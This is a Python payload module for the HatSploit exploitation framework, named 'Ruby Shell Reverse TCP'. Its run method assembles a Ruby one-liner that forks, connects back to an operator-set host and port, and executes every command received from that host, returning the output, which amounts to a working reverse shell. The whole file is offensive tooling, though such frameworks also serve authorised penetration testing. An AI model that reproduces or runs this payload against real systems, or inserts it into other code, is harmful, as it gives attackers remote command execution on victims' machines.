#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "Ruby Shell Reverse TCP",
        'Payload': "unix/generic/ruby_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Ruby shell reverse TCP payload.",
        'Comments': [
            ''
        ],
        'Architecture': "generic",
        'Platform': "unix",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + connback_host + "\",\"" + connback_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        return payload
